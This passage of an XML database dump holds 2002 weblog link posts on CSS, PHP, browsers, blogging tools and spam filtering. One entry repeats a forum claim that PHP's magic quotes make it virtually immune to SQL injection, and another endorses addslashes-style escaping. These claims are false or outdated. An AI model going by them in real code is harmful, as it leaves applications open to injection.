		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.wired.com/wired/archive/10.09/vegas.html&quot;&gt;Hacking Las Vegas&lt;/a&gt; (via &lt;a href=&quot;http://www.kryogenix.org/days/000211.cas#000211&quot; title=&quot;Linky goodness&quot;&gt;Kryogenix&lt;/a&gt;) - the story of how a bunch of wizz kids from &lt;acronym title=&quot;The Massachusetts Institute of Technology&quot;&gt;MIT&lt;/acronym&gt; devised the perfect card counting technique and took the casinos for the ride of their lives. Edge-of-your-seat stuff.&lt;/p&gt;</field>
		<field name="created">2002-08-15 17:30:05</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">316</field>
		<field name="title">More mailing list etiquette</field>
		<field name="slug">moreMailingListEtiquette</field>
		<field name="body">&lt;p&gt;Madhu Menon: &lt;a href=&quot;http://madman.weblogs.com/2002/01/22&quot;&gt;Avoiding personal conflict on mailing lists&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-08-15 17:36:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">317</field>
		<field name="title">Patented IMBots</field>
		<field name="slug">patentedIMBots</field>
		<field name="body">&lt;p&gt;I wonder if &lt;a href=&quot;http://www.internetnews.com/bus-news/article.php/1446781&quot; title=&quot;ActiveBuddy&amp;apos;s Patent Win Riles IM Bot Developers&quot;&gt;these muppets&lt;/a&gt; have heard of &lt;a href=&quot;http://www.eggheads.org/&quot;&gt;eggdrop&lt;/a&gt; (created 1993). Something tells me prior art for this one won't be too hard to find.&lt;/p&gt;</field>
		<field name="created">2002-08-15 19:34:43</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">318</field>
		<field name="title">PHP numbered code listings</field>
		<field name="slug">phpNumberedCode</field>
		<field name="body">&lt;p&gt;Michael V has written a &lt;a href=&quot;http://www.tidakada.com/highlight_numbered_test.php&quot;&gt;couple of functions&lt;/a&gt; to apply my &lt;a href=&quot;http://development.incutio.com/simon/numbered-code-experiment.html &quot;&gt;CSS numbered code listing&lt;/a&gt; technique to PHP's built in syntax highlighting.&lt;/p&gt;</field>
		<field name="created">2002-08-15 20:14:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">319</field>
		<field name="title">Today's required reading</field>
		<field name="slug">todaysRequiredReading</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.alistapart.com/stories/writeliving/&quot;&gt;10 Tips on Writing the Living Web&lt;/a&gt; is full of invaluable advice for anyone who wants their weblog to be of interest to other people.&lt;/p&gt;</field>
		<field name="created">2002-08-16 00:30:25</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">320</field>
		<field name="title">css-discuss rocks</field>
		<field name="slug">cssDiscussRocks</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://three.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;css-discuss&lt;/a&gt; has seen some interesting threads in the past 24 hours and the new archive means I can link straight to them - so here goes. Kentaro Kaji &lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=10984&quot; title=&quot;[css-d] two adjacent boxes with bottoms aligned&quot;&gt;kicked off&lt;/a&gt; the topic of techniques for aligning an image with the bottom of a block of text. In the same thread, Benn Nunn &lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=11060&quot; title=&quot;Re: [css-d] two adjacent boxes with bottoms aligned&quot;&gt;advocated&lt;/a&gt; avoiding width and height attributes on images and keeping that information in an external style sheet. Other topics included &lt;a href=&quot;http://archivist.incutio.com/css-discuss/?search=accessible+navigation+skip&quot;&gt;accessible navigation&lt;/a&gt; and a tricky &lt;a href=&quot;http://archivist.incutio.com/css-discuss/?id=11010&quot; title=&quot;[css-d] Weird Opera problem with position: absolute&quot;&gt;absolute positioning problem&lt;/a&gt; with Opera. The most informative mailing list I'm currently subscribed to just keeps getting better.&lt;/p&gt;</field>
		<field name="created">2002-08-16 00:53:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">321</field>
		<field name="title">Zeldman played by a stand up comic</field>
		<field name="slug">zeldmanPlayedByAStandUpComic</field>
		<field name="body">&lt;p&gt;Eric Meyer has &lt;a href=&quot;http://www.meyerweb.com/&quot; title=&quot;No permalink!&quot;&gt;confessed&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-08-16 02:04:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">322</field>
		<field name="title">Python RSS locator</field>
		<field name="slug">pythonRssLocator</field>
		<field name="body">&lt;p&gt;Mark Pilgrim has written an &lt;a href=&quot;http://diveintomark.org/archives/2002/08/15.html#ultraliberal_rss_locator&quot;&gt;ultra-liberal RSS locator&lt;/a&gt; (in Python, naturally). I guess he had to scratch an itch. The amount of work it puts in to locating an &lt;acronym title=&quot;Rich Site Summary&quot;&gt;RSS&lt;/acronym&gt; feed for a site is astonishing, especially when you consider how short the actual code is.&lt;/p&gt;</field>
		<field name="created">2002-08-16 02:19:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">323</field>
		<field name="title">New memes make Baby Jesus cry</field>
		<field name="slug">newMemesMakeBabyJesusCry</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.google.com/search?q=%22makes+baby+jesus+cry%22&quot;&gt;Things that make Baby Jesus cry&lt;/a&gt; (stolen from &lt;a href=&quot;http://diveintomark.org/archives/2002/08/16.html#google_makes_baby_jesus_cry&quot; title=&quot;Google makes Baby Jesus Cry&quot;&gt;Mark Pilgrim&lt;/a&gt;). Google as social commentary?&lt;/p&gt;</field>
		<field name="created">2002-08-16 11:01:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">324</field>
		<field name="title">Magic quotes solution</field>
		<field name="slug">magicQuotesSolution</field>
		<field name="body">&lt;p&gt;Pink Goblin (otherwise known as HarryF) explains &lt;a href=&quot;http://www.pinkgoblin.com/quotesarticle.php&quot;&gt;why magic quotes are evil&lt;/a&gt;. This is an issue that every &lt;acronym title=&quot;PHP: Hypertext Preprocessor&quot;&gt;PHP&lt;/acronym&gt; developer should be aware of, as it can cause all kinds of problems in your scripts if you ignore it. He suggests using a custom &lt;code&gt;myAddSlashes()&lt;/code&gt; function which only calls addslashes() if magic quotes are turned off. I have an alternative solution - chose your preferred setting (quotes on or off) and apply it at run time to all incoming data in one go. My code for doing this is &lt;a href=&quot;http://scripts.incutio.com/magic_quotes/&quot;&gt;available here&lt;/a&gt;. By a bizzare coincidence I wrote the script this morning, then spotted a link to the Pink Goblin article on &lt;a href=&quot;http://tidakada.com/m/2002/w/33#magic_quotes__..._no_thanks&quot; title=&quot;magic quotes !... no thanks&quot;&gt;tidak ada&lt;/a&gt; literally five minutes after finishing it.&lt;/p&gt;</field>
		<field name="created">2002-08-16 11:24:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">325</field>
		<field name="title">Comments improvement</field>
		<field name="slug">commentsImprovement</field>
		<field name="body">&lt;p&gt;I've improved the comment system at the bequest of Adrian Holovaty. URLs posted in a comment (both those beginning with &lt;code&gt;http://&lt;/code&gt; and those beginning just with &lt;code&gt;www.&lt;/code&gt;) will now be converted in to links.&lt;/p&gt;</field>
		<field name="created">2002-08-16 15:24:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">326</field>
		<field name="title">Fiendish markup quiz</field>
		<field name="slug">fiendishMarkupQuiz</field>
		<field name="body">&lt;p&gt;Hixie has posed a &lt;a href=&quot;http://ln.hixie.ch/?start=1029524973&amp;amp;count=1&quot;&gt;fiendish markup quiz&lt;/a&gt; - spot the four markup errors in a document that validates. It's harder than it sounds. I've mailed off my answers, but I'm not expecting to get full marks.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Update:&lt;/em&gt; 4 out of 4! :D&lt;/p&gt;</field>
		<field name="created">2002-08-16 23:06:37</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">327</field>
		<field name="title">A plan for spam</field>
		<field name="slug">aPlanForSpam</field>
		<field name="body">&lt;p&gt;Paul Graham: &lt;a href=&quot;http://www.paulgraham.com/spam.html&quot;&gt;A Plan for Spam&lt;/a&gt;. Paul suggests using content based filters that learn from users specifically marking messages as spam or legitimate mail. The system then picks emails apart looking for commmon terms (in both the body and the header of the message) that can then be used later on to identify spam messages. He claims his test have let through &lt;q cite=&quot;http://www.paulgraham.com/spam.html&quot;&gt;only 5 per 1000 spams, with 0 false positives&lt;/q&gt;. Impressive stuff, and great reading for the excellent explanations of some advanced alogithmic and statistical techniques.&lt;/p&gt;</field>
		<field name="created">2002-08-16 23:40:36</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">328</field>
		<field name="title">Why Scott doesn't read your blog</field>
		<field name="slug">whyScottDoesntReadYourBlog</field>
		<field name="body">&lt;p&gt;Scott: &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/08/17.html#a458&quot;&gt;Why I'm Not Reading Your Blog and Why Others May Not Be Also&lt;/a&gt;. Scott likes text he can resize and a decent update frequency. Tony Bowden &lt;a href=&quot;http://www.tmtm.com/insanity/2002/08/17.html#a235&quot; title=&quot;How to Read Blogs&quot;&gt;responds&lt;/a&gt; that update frequency is no longer an issue for him ever since he switched to using a blog roll that shows him when the blogs listed were last updated. The same is true for me - my blo.gs powered blog roll has slashed the amount of time I spend keeping up with other people's blogs as I only visit them when there's something new to read.&lt;/p&gt;
</field>
		<field name="created">2002-08-17 14:38:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">329</field>
		<field name="title">Tips for working from home</field>
		<field name="slug">tipsForWorkingFromHome</field>
		<field name="body">&lt;p&gt;Another cracking article from Scott: &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/08/17.html#a459&quot;&gt;12 Tips for Working from Home But Keeping it Under Control&lt;/a&gt;. I worked from home for a while last year and these tips make a lot of sense (I know because I wasn't doing any of them and I suffered as a result).&lt;/p&gt;</field>
		<field name="created">2002-08-17 14:41:31</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">330</field>
		<field name="title">PHP immune to SQL injection attacks</field>
		<field name="slug">phpSqlInjectionAttacks</field>
		<field name="body">&lt;p&gt;An interesting thread on SitePoint about &lt;a href=&quot;http://www.sitepointforums.com/showthread.php?threadid=72520&quot; title=&quot;SQL Injection Attacks - Are You Safe?&quot;&gt;SQL injection attacks&lt;/a&gt;. One of the points brought up is that PHP is by default virtually immune to injection attacks thanks to magic quotes (discussed here &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/08/16/#magicQuotesSolution&quot;&gt;yesterday&lt;/a&gt;).&lt;/p&gt;</field>
		<field name="created">2002-08-17 14:47:55</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">331</field>
		<field name="title">Working on my blog</field>
		<field name="slug">workingOnMyBlog</field>
		<field name="body">&lt;p&gt;If I don't post much today it's because I'm hard at work on the new database driven version of this blog. I'm hoping to open souce it so I'm trying to design it to be as easy to customise and modify as possible, which means plugin support, themes and an extensible &lt;acronym title=&quot;Application Programming Interface&quot;&gt;API&lt;/acronym&gt;. At the moment it will only work with mySQL but I'm trying to keep the data access routines abstracted away so they can be easily replaced with code for other databases or even a flat file or XML storage system.&lt;/p&gt;</field>
		<field name="created">2002-08-17 14:54:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">332</field>
		<field name="title">CSS image rollovers</field>
		<field name="slug">cssImageRollovers</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.uoguelph.ca/%7Estuartr/articles/cssrollovers.shtml&quot;&gt;CSS Image Rollovers&lt;/a&gt; describes a brilliantly simple technique for creating the effect of an image rollover using only one image and no javascript. The effect works by creating a gif with a transparent background, then using a &lt;code&gt;:hover&lt;/code&gt; pseudo class to change the background colour of the the containing area. Pretty straight forward so far, but the clever part is that by making the transparent part of the gif an interesting shape (placing it around the outline of a shape in the image for example) you can give the impression of displaying a different image entirely.&lt;/p&gt;</field>
		<field name="created">2002-08-17 15:08:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">333</field>
		<field name="title">Today's pleasant surprise</field>
		<field name="slug">todaysPleasantSurprise</field>
		<field name="body">&lt;p&gt;Today's pleasant surprise - while surfing around the &lt;a href=&quot;http://forums.wireplay.co.uk/&quot;&gt;Wireplay forums&lt;/a&gt; I came across a link to &lt;a href=&quot;http://www.alliedassault.co.uk/&quot;&gt;alliedassault.co.uk&lt;/a&gt;, a community site for Medal of Honour: Allied Assault. Imagine my surprise when I realised the news section was coded by me! It uses a news script I wrote over a year ago and never got around to finishing - I released it to a few people and it seems Reality ended up using it on the site. It's great to see code you've written being used after you've all but forgotten about it - the site also uses my &lt;a href=&quot;http://scripts.incutio.com/sslinks/&quot;&gt;ssLinks&lt;/a&gt; link management script, the sequel to which I am &lt;a href=&quot;http://scripts.incutio.com/directory/&quot; title=&quot;IncDirectory&quot;&gt;working on now&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-08-17 19:12:10</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">334</field>
		<field name="title">Netscape Google?</field>
		<field name="slug">netscapeGoogle</field>
		<field name="body">&lt;p&gt;Sam Buchanan: The &lt;a href=&quot;http://afongen.com/blog/archives/2002_08.php&quot;&gt;Netscape Google&lt;/a&gt; mystery. A user complains of a non functional web appli ation, and when asked what browser they are using replies &quot;Netscape Google&quot;. Sam suspects that this is because Google is their home page and they type URLs straight in to the Google search box. I wouldn't be surprised if he was right - I have seen several people (including an Aunt of mine) do this in the past. Sam's summary rings particularly true:&lt;/p&gt;&lt;blockquote cite=&quot;http://afongen.com/blog/archives/2002_08.php&quot;&gt;&lt;p&gt;I'm not sure how to climb inside this user's head. It's a very alien experience. But I have to do it. Because for every bit of code I write, every navigation scheme that I dream up, Netscape Google is at the other end, actually trying to use it.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-08-17 21:03:19</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">335</field>
		<field name="title">The Lessig debate</field>
		<field name="slug">theLessigDebate</field>
		<field name="body">&lt;p&gt;I watched Laurence Lessig's &lt;acronym title=&quot;O&amp;apos;Reilly Open Source Convention&quot;&gt;OSCON&lt;/acronym&gt; keynote the other day (an 8.4MB &lt;a href=&quot;http://randomfoo.net/oscon/2002/lessig/&quot;&gt;Flash file&lt;/a&gt; courtesy of &lt;a href=&quot;http://randomfoo.net/&quot;&gt;Leonard Lin&lt;/a&gt;). A transcript of the session is &lt;a href=&quot;http://www.oreillynet.com/pub/a/policy/2002/08/15/lessig.html&quot; title=&quot;Lawrence Lessig Keynote from OSCON 2002 &quot;&gt;also available&lt;/a&gt;. It was an excellent presentation and really opened my eyes to the issues facing intellectual property in the United States. It also appears to have raised some hackles - Dave Winer &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/08/17#When:9:02:51AM&quot;&gt;took offence&lt;/a&gt; to the implication that developers had not done anything about the problem, and Doc Searls has &lt;a href=&quot;http://doc.weblogs.com/2002/08/18#whoDoesWhat&quot; title=&quot;Who does what&quot;&gt;responded&lt;/a&gt; to Dave's criticism with some interesting background information on Lessig.&lt;/p&gt;</field>
		<field name="created">2002-08-18 11:08:27</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">336</field>
		<field name="title">Off down to Exeter</field>
		<field name="slug">offDownToExeter</field>
		<field name="body">&lt;p&gt;I'm off down to Exeter to see my girlfriend this afternoon, then we're heading off to the Reading Festival on Wednesday. Updates will be scarce for the next few days.&lt;/p&gt;</field>
		<field name="created">2002-08-18 11:50:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">337</field>
		<field name="title">Back from Reading</field>
		<field name="slug">backFromReading</field>
		<field name="body">&lt;p&gt;Back from Reading. 3,200 emails (I forgot to unsubscribe from some mailing lists). &amp;lt;sigh&amp;gt;&lt;/p&gt;</field>
		<field name="created">2002-08-30 18:13:33</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">338</field>
		<field name="title">DevShed stuff</field>
		<field name="slug">devshedStuff</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.devshed.com/&quot;&gt;DevShed&lt;/a&gt; have published two useful new articles - &lt;a href=&quot;http://www.devshed.com/Server_Side/Python/PythonMySQL/&quot;&gt;MySQL Connectivity With Python&lt;/a&gt; and &lt;a href=&quot;http://www.devshed.com/Server_Side/MySQL/SQLJoins/&quot;&gt;Understanding SQL Joins&lt;/a&gt;. They also now provide nice looking printer-friendly &lt;acronym title=&quot;Portable Document Format &quot;&gt;PDF&lt;/acronym&gt; versions of articles, which appear to be dynamically generated. Having found &lt;a href=&quot;http://www.zope.org/Members/mjablonski/howtoPDF&quot; title=&quot;How to create a PDF-Document on the fly?&quot;&gt;this article&lt;/a&gt; on Google I suspect they are using &lt;a href=&quot;http://www.easysw.com/htmldoc/&quot;&gt;HTMLDOC&lt;/a&gt; to create the PDFs.&lt;/p&gt;</field>
		<field name="created">2002-08-30 18:40:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">339</field>
		<field name="title">Mozilla pie menus</field>
		<field name="slug">mozillaPieMenus</field>
		<field name="body">&lt;p&gt;I've installed a brand new shiny copy of &lt;a href=&quot;http://www.mozilla.org/releases/&quot;&gt;Mozilla 1.1&lt;/a&gt;, and thrown in the new &lt;a href=&quot;http://optimoz.mozdev.org/piemenus/&quot;&gt;Pie Menus&lt;/a&gt; addon for good measure. The new build seems a fair bit speedier than the 1.1 alpha version I was using before, but other than that and some funky new icons I haven't spotted many differences. Pie Menus are interesting (and have already been discussed at length on &lt;a href=&quot;http://mozillazine.org/talkback.html?article=2407&quot; title=&quot;RadialContext Pie Menu Beta Available at Optimoz&quot;&gt;Mozillazine&lt;/a&gt;, &lt;a href=&quot;http://www.deftone.com/blogzilla/archives/mmmpie_menus.html&quot; title=&quot;Mmm...pie menus&quot;&gt;Blogzilla&lt;/a&gt; and &lt;a href=&quot;http://slashdot.org/articles/02/08/22/1732201.shtml&quot; title=&quot;Pie-Menus in Mozilla&quot;&gt;Slashdot&lt;/a&gt;) but don't seem as useful as &lt;a href=&quot;http://optimoz.mozdev.org/gestures/&quot;&gt;mouse gestures&lt;/a&gt;, although they have a much shallower learning curve.&lt;/p&gt;</field>
		<field name="created">2002-08-30 20:01:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">340</field>
		<field name="title">Marquee in Mozilla</field>
		<field name="slug">marqueeInMozilla</field>
		<field name="body">&lt;p&gt;News to me: Mozilla supports the &lt;code&gt;&amp;lt;marquee&amp;gt;&lt;/code&gt; element (&lt;a href=&quot;http://www.hicom.net/~oedipus/wai/ua/tests/scrolling_text_test1.html&quot; title=&quot;Scrolling Text Test, 1&quot;&gt;marquee test page&lt;/a&gt;)! Support was added a couple of months ago in light of the fact that &lt;q cite=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=156979#c26&quot;&gt;nearly 30% of top 150 sites in China use the marquee
element&lt;/q&gt;. &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=156979&quot; title=&quot;XBL emulation of marquee&quot;&gt;Bug 156979&lt;/a&gt; contains a fascinating discussion of this issue and why the decision was made to implement this controversial extension to the standards. Hogarth has &lt;a href=&quot;http://mozilla.weebeastie.net/marquee.shtml&quot; title=&quot;How I delt with &amp;lt;marquee&amp;gt; and made best friends with my eyeballs&quot;&gt;a page&lt;/a&gt; detailing a way of disabling the behaviour of the element in your own Mozilla installation.&lt;/p&gt;</field>
		<field name="created">2002-08-30 20:26:14</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">341</field>
		<field name="title">Opera 7, coming soon</field>
		<field name="slug">opera7</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.opera.com/news/opera07/&quot;&gt;Coming soon: Opera 7&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote cite=&quot;http://www.opera.com/news/opera07/&quot;&gt;&lt;p&gt;Over one year ago Opera's engineers started working on two separate development branches. One of them later became the successful Opera 6, released in December 2001. The latter was a longer project: optimizing Opera's core with the latest and best in standards support and features, while not compromising speed.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-08-30 21:06:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">342</field>
		<field name="title">DOM-Drag</field>
		<field name="slug">domDrag</field>
		<field name="body">&lt;p&gt;youngpup's &lt;a href=&quot;http://www.youngpup.net/?request=/components/dom-drag.xml&amp;amp;xpath=/project/description&quot;&gt;DOM-drag&lt;/a&gt; is a cross browser library for creating draggable interfaces in DHTML. I had previously been looking at using Glen Murphy's &lt;a href=&quot;http://bodytag.org/nav.php?u=drag1/&quot;&gt;dragdiv&lt;/a&gt; for this kind of thing but DOM-Drag looks like a more mature implementation.&lt;/p&gt;</field>
		<field name="created">2002-08-30 21:10:17</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">343</field>
		<field name="title">Sanity</field>
		<field name="slug">sanity</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.theregister.co.uk/content/6/26802.html&quot; title=&quot;BT loses hypertext claim&quot;&gt;BT lose&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-08-30 22:38:29</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">344</field>
		<field name="title">Zeldman gems</field>
		<field name="slug">zeldmanGems</field>
		<field name="body">&lt;p&gt;Two gems from Jeffrey Zeldman: &lt;a href=&quot;http://www.zeldman.com/daily/0802c.html#evangeline&quot;&gt;Show, don’t sell&lt;/a&gt; and &lt;a href=&quot;http://www.zeldman.com/daily/0802d.html#livedandlovedlikefrank&quot;&gt;Table Layouts, Revisited&lt;/a&gt;. An extract from the former:&lt;/p&gt;&lt;blockquote cite=&quot;http://www.zeldman.com/daily/0802c.html#evangeline&quot;&gt;&lt;p&gt;Take credit for what CSS has done. Don’t say: &quot;Web standards did this.&quot; Do say: &quot;We’ve set up a system that will automatically format the page whenever you update it.&quot; Let the client think you’re smart and give you more business.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;In the latter, Jeffrey sings the praise of transitional layouts which use simplified table structures enhanced with CSS, thus providing a more practical aproach to dealing with commercial requirements and legacy browsers.&lt;/p&gt;</field>
		<field name="created">2002-08-30 22:48:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">345</field>
		<field name="title">Trackback roundup</field>
		<field name="slug">trackbackRoundup</field>
		<field name="body">&lt;p&gt;Plenty of action on the &lt;a href=&quot;http://www.movabletype.org/trackback/&quot;&gt;TrackBack&lt;/a&gt; front. Michel V is &lt;a href=&quot;http://tidakada.com/archives/m/200208#TrackBack_in_b2&quot; title=&quot;TrackBack in b2&quot;&gt;adding&lt;/a&gt; TrackBack support to b2, Moveable Type have released a &lt;a href=&quot;http://www.movabletype.org/docs/tb-standalone.html&quot;&gt;standalone Perl implementation&lt;/a&gt; of TrackBack under the Artistic license, MetaFilter have &lt;a href=&quot;http://www.metafilter.com/tb.mefi&quot; title=&quot;Trackback at MetaFilter&quot;&gt;added TrackBack support&lt;/a&gt; and Matt Kingston has published a full blown &lt;a href=&quot;http://www.hitormiss.org/projects/trackback/&quot;&gt;Homebrew TrackBack Tutorial&lt;/a&gt; for people who want to roll TrackBack support in to their own home grown blogs. Yet another thing to add to the todo list...&lt;/p&gt;</field>
		<field name="created">2002-08-30 22:59:38</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">346</field>
		<field name="title">Phil says goodbye to the popups</field>
		<field name="slug">philSaysGoodbye</field>
		<field name="body">&lt;p&gt;Phil Ringnalda has &lt;a href=&quot;http://philringnalda.com/archives/002300.php&quot; title=&quot;We don&amp;apos;t need no stinkin&amp;apos; popups&quot;&gt;done the decent thing&lt;/a&gt; and rid himself of comment popups (the comments attached to his post make interesting reading). I haven't got round to doing this yet, which is especially silly considering I open my own comments links in new tabs to avoid the popups myself. The main problem I have is that I want people to permalink to each entry within the context of the day it was posted - comments without a popup would need each entry to have its own comments page which could lead to people linking to the wrong place. My options so far are either to trust people to link to the permalink rather than the entry comments page or to go with a &quot;show comments on the page&quot; feature, possibly using a hidden div or even an external comment loader script as demonstrated by &lt;a href=&quot;http://www.kryogenix.org/&quot;&gt;kryogenix&lt;/a&gt; a few weeks ago.&lt;/p&gt;</field>
		<field name="created">2002-08-30 23:07:15</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">347</field>
		<field name="title">Some stuff</field>
		<field name="slug">someStuff</field>
		<field name="body">&lt;p&gt;A few other things I read today:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www-106.ibm.com/developerworks/web/library/wa-phprock1/index.html&quot;&gt;Develop rock-solid code in PHP, Part 1&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/QA/2002/04/Web-Quality&quot;&gt;My Web site is standard! And yours?&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.alistapart.com/stories/strange/&quot;&gt;Dr. Strangeglobe: Or How I Learned to Stop Worrying and Love The W3C.&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://charlottegraymovie.warnerbros.com/cmp/styleguide.html&quot;&gt;Charlotte Gray: Super Secret Style Guide&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.salon.com/tech/feature/2002/08/20/jenkins_on_donahue/print.html&quot;&gt;Coming up next: Ambushed on &quot;Donahue&quot;!&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.google.com/options/&quot;&gt;Google Services &amp;amp; Tools&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</field>
		<field name="created">2002-08-30 23:51:57</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">348</field>
		<field name="title">More stuff</field>
		<field name="slug">moreStuff</field>
		<field name="body">&lt;p&gt;And some more...&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.oreillynet.com/pub/wlg/1878&quot;&gt;Open Source Tools and the Process of Programming&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.howstuffworks.com/penny-per-page.htm&quot;&gt;How Penny Per Page Might Work&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.evolt.org/article/Describing_Document_Text_for_Accessibility/4090/36896/index.html&quot;&gt;Describing Document Text for Accessibility&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.evolt.org/article/A_revised_method_of_defining_link_pseudo_classes/17/35541/index.html&quot;&gt;A revised method of defining link pseudo classes&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.evolt.org/article/Optimising_Return_On_Investment_with_Intranets/25/35700/index.html&quot;&gt;Optimising Return On Investment with Intranets&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</field>
		<field name="created">2002-08-30 23:53:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">349</field>
		<field name="title">RDF is dead</field>
		<field name="slug">RDFisDead</field>
		<field name="body">&lt;p&gt;Peter provides an &lt;a href=&quot;http://poorbuthappy.com/ease/000358.html&quot;&gt;interesting perspective&lt;/a&gt;:&lt;/p&gt;&lt;blockquote cite=&quot;http://poorbuthappy.com/ease/000358.html&quot;&gt;&lt;p&gt;&lt;strong&gt;RDF is dead as a popular metadata format&lt;/strong&gt;. If it was gonna happen, it would have already. Forget about it.&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;Peter goes on to say (in the comments attached to the entry) that &lt;acronym title=&quot;Resource Description Framework&quot;&gt;RDF&lt;/acronym&gt;'s biggest obstacle is the fact that it requires write-access - only the content owner can add meta data. External meta data implementations such as &lt;acronym title=&quot;XML Topic Maps&quot;&gt;XTM&lt;/acronym&gt; and &lt;acronym title=&quot;eXchangable Faceted Metadata Language&quot;&gt;XFML&lt;/acronym&gt; are inherently more flexible.&lt;/p&gt;</field>
		<field name="created">2002-08-31 14:01:18</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">350</field>
		<field name="title">External link icons in CSS</field>
		<field name="slug">externalLinkIconsInCSS</field>
		<field name="body">&lt;p&gt;Stuart has &lt;a href=&quot;http://www.kryogenix.org/days/000233.cas#000233&quot; title=&quot;External link icons the CSS way&quot;&gt;put together&lt;/a&gt; a nice demonstration of how Mozilla's &lt;acronym title=&quot;Cascading Style Sheets&quot;&gt;CSS&lt;/acronym&gt;3 selectors can be used to automatically add icons to external links, in response to Mark Pilgrim's guide to &lt;a href=&quot;http://diveintomark.org/archives/2002/08/22.html#automatically_inserting_images_before_offsite_links&quot; title=&quot;Automatically inserting images before offsite links&quot;&gt;achieving the same effect&lt;/a&gt; using Moveable Type macros.&lt;/p&gt;</field>
		<field name="created">2002-08-31 14:10:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">351</field>
		<field name="title">How the wayback machine works</field>
		<field name="slug">howTheWaybackMachineWorks</field>
